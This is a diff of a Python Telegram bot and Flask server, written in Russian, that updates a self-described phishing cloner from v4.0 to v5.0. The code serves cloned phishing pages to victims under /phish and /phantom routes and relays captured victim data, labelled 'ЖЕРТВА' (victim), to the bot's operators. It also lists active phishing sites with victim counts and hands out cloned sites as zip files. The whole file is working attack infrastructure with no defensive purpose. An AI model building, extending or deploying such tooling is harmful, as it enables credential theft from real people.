-            bot.edit_message_text("❌ Ошибка создания", message.chat.id, msg.message_id)
+            bot.edit_message_text("❌ Ошибка", message.chat.id, msg.message_id)
     
     threading.Thread(target=process).start()
 
-@bot.message_handler(commands=['panel'])
-def show_panel(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        return
-    
-    args = message.text.split()
-    if len(args) < 2:
-        bot.reply_to(message, "❌ /panel PHISH_ID")
-        return
-    
-    phish_id = args[1]
-    server_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', request.host_url.rstrip('/'))
-    panel_url = f"{server_url}/panel/{phish_id}"
-    
-    bot.reply_to(message, f"📊 Панель логов:\n{panel_url}")
-
-@bot.message_handler(commands=['logs'])
-def show_logs(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        return
-    
-    args = message.text.split()
-    if len(args) < 2:
-        bot.reply_to(message, "❌ /logs PHISH_ID")
-        return
-    
-    phish_id = args[1]
-    phish = PHISH_SITES.get(phish_id)
-    
-    if not phish:
-        # Пробуем загрузить из файла
-        log_file = f'/tmp/phish_logs/{phish_id}/logs.json'
-        if os.path.exists(log_file):
-            with open(log_file) as f:
-                logs = [json.loads(line) for line in f.readlines()[-10:]]
-        else:
-            bot.reply_to(message, "❌ Нет логов")
-            return
-    else:
-        logs = phish.get('logs', [])
-    
-    if not logs:
-        bot.reply_to(message, "📭 Пока нет жертв")
-        return
-    
-    for log in logs[-5:]:  # Последние 5
-        text = "🔥 ЖЕРТВА:\n"
-        for k, v in log.items():
-            if k not in ['user_agent', 'referer']:
-                text += f"<b>{k}</b>: <code>{v}</code>\n"
-        
-        bot.send_message(message.chat.id, text, parse_mode='HTML')
-
-@bot.message_handler(commands=['list'])
-def list_phish(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        return
-    
-    if not PHISH_SITES:
-        bot.reply_to(message, "📭 Нет фишинг-сайтов")
-        return
-    
-    text = "🎣 АКТИВНЫЕ ФИШИНГ-САЙТЫ:\n\n"
-    server_url = os.environ.get('RAILWAY_PUBLIC_DOMAIN', 'localhost')
-    
-    for pid, p in PHISH_SITES.items():
-        victims = len(p.get('logs', []))
-        text += f"🔑 <code>{pid}</code>\n"
-        text += f"🎯 {p['url']}\n"
-        text += f"👥 Жертв: {victims}\n"
-        text += f"📊 /panel {pid}\n"
-        text += f"🎣 {server_url}/phish/{pid}\n\n"
-    
-    bot.reply_to(message, text, parse_mode='HTML')
-
 @bot.message_handler(commands=['get'])
-def get_file(message):
-    if message.from_user.id not in ALLOWED_USERS:
-        return
+def get_cmd(message):
+    if message.from_user.id not in ALLOWED_USERS: return
     
     args = message.text.split()
-    if len(args) < 2:
-        return
+    if len(args) < 2: return
     
-    task_id = args[1]
-    task = ACTIVE_TASKS.get(task_id)
+    tid = args[1]
+    task = ACTIVE_TASKS.get(tid)
     
-    if not task or task['status'] != 'done':
+    if not task or task.get('status') != 'done':
         bot.reply_to(message, "❌ Не готово")
         return
     
-    filepath = task.get('file')
-    if not filepath or not os.path.exists(filepath):
+    path = task.get('file')
+    if not path or not os.path.exists(path):
         bot.reply_to(message, "❌ Файл не найден")
         return
     
-    with open(filepath, 'rb') as f:
-        bot.send_document(message.chat.id, f, 
-                         visible_file_name=f"phish_{task.get('phish_id','clone')}.zip")
+    with open(path, 'rb') as f:
+        bot.send_document(message.chat.id, f, visible_file_name=f"{task.get('type','file')}_{tid}.zip")
 
-# ========== ОТДАЧА ФИШИНГ-СТРАНИЦ ==========
-@app.route('/phish/<phish_id>')
-def serve_phish(phish_id):
-    """Отдаёт фишинг-страницу жертве"""
-    index_path = f'/tmp/phish/{phish_id}/index.html'
-    if os.path.exists(index_path):
-        with open(index_path, 'r', encoding='utf-8') as f:
-            return f.read()
-    return "Страница не найдена", 404
+@bot.message_handler(commands=['list'])
+def list_cmd(message):
+    if message.from_user.id not in ALLOWED_USERS: return
+    
+    done = {k:v for k,v in ACTIVE_TASKS.items() if v.get('status')=='done'}
+    active = {k:v for k,v in PHISH_SITES.items()}
+    
+    text = "📊 АКТИВНОЕ:\n\n"
+    if active:
+        for pid, p in active.items():
+            text += f"🔑 {pid} | {p.get('type','?')}\n"
+            text += f"🎯 {p.get('domain','?')}\n"
+            text += f"👥 Жертв: {len(p.get('logs',[]))}\n"
+            text += f"📊 /panel {pid}\n\n"
+    else:
+        text += "Нет активных фишинг-сайтов\n"
+    
+    text += f"\n📦 ГОТОВЫЕ КЛОНЫ: {len(done)} шт.\n/get ID для скачивания"
+    
+    bot.reply_to(message, text)
 
-@app.route('/phish/<phish_id>/assets/<folder>/<filename>')
-def serve_asset(phish_id, folder, filename):
-    """Отдаёт ассеты фишинг-сайта"""
-    path = f'/tmp/phish/{phish_id}/assets/{folder}/{filename}'
+@bot.message_handler(commands=['panel'])
+def panel_cmd(message):
+    if message.from_user.id not in ALLOWED_USERS: return
+    
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ /panel ID")
+        return
+    
+    server = os.environ.get('RAILWAY_PUBLIC_DOMAIN', request.host_url.rstrip('/'))
+    bot.reply_to(message, f"📊 {server}/panel/{args[1]}")
+
+@bot.message_handler(commands=['logs'])
+def logs_cmd(message):
+    if message.from_user.id not in ALLOWED_USERS: return
+    
+    args = message.text.split()
+    if len(args) < 2: return
+    
+    phish = PHISH_SITES.get(args[1])
+    if not phish or not phish.get('logs'):
+        bot.reply_to(message, "📭 Нет логов")
+        return
+    
+    for log in phish['logs'][-5:]:
+        text = "🔥 ЖЕРТВА:\n"
+        for k, v in log.items():
+            if k not in ['user_agent']:
+                text += f"<b>{k}</b>: <code>{v}</code>\n"
+        bot.send_message(message.chat.id, text, parse_mode='HTML')
+
+# ========== ОТДАЧА СТРАНИЦ ==========
+@app.route('/phantom/<phish_id>')
+def serve_phantom(phish_id):
+    path = f'/tmp/phantom/{phish_id}/index.html'
     if os.path.exists(path):
-        mimetypes = {
-            'css': 'text/css',
-            'js': 'application/javascript',
-            'png': 'image/png',
-            'jpg': 'image/jpeg',
-            'svg': 'image/svg+xml',
-            'woff': 'font/woff',
-            'woff2': 'font/woff2',
-        }
-        mime = mimetypes.get(folder, 'application/octet-stream')
+        return open(path, 'r', encoding='utf-8').read()
+    return "Не найдено", 404
+
+@app.route('/phantom/<phish_id>/<path:filename>')
+def serve_phantom_assets(phish_id, filename):
+    path = f'/tmp/phantom/{phish_id}/{filename}'
+    if os.path.exists(path):
+        mime = 'image/png'
+        if filename.endswith('.css'): mime = 'text/css'
+        elif filename.endswith('.js'): mime = 'application/javascript'
         return open(path, 'rb').read(), 200, {'Content-Type': mime}
     return "Not found", 404
 
 @app.route('/')
 def home():
-    return "Bot is running!", 200
+    return "Running", 200
 
 # ========== ЗАПУСК ==========
-def run_bot():
-    bot.infinity_polling()
-
 if __name__ == '__main__':
-    print("🎣 Фишинг-Клонер v4.0 запущен!")
-    os.makedirs('/tmp/phish', exist_ok=True)
-    os.makedirs('/tmp/phish_logs', exist_ok=True)
-    threading.Thread(target=run_bot).start()
+    print("🚀 v5.0 запущен!")
+    os.makedirs('/tmp/clones', exist_ok=True)
+    os.makedirs('/tmp/phantom', exist_ok=True)
+    threading.Thread(target=bot.infinity_polling).start()
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
